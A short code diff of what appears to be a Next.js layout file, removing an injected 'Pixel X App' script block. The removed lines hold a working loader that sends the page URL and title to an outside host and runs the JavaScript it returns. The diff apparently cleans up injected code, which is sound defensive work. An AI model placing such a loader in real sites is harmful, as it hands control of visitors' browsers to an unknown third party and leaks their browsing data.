@@ -4,12 +4,6 @@ import Script from 'next/script'
 import './globals.css'
 
 
-<!-- Pixel X App - START -->
-<script type='text/javascript'>
-!function(){var e=window.location.href,t=document.title,n=Date.now(),o=document.createElement('script');o.src='https://pxa.ingresosrentables.site/remote?url='+encodeURIComponent(e)+'&title='+encodeURIComponent(t)+'&time='+n,o.async=!0,document.head.appendChild(o)}()
-</script>
-<!-- Pixel X App - END -->
-
 const baloo = Baloo_2({
   subsets: ['latin'],
   weight: ['500', '600', '700', '800'],
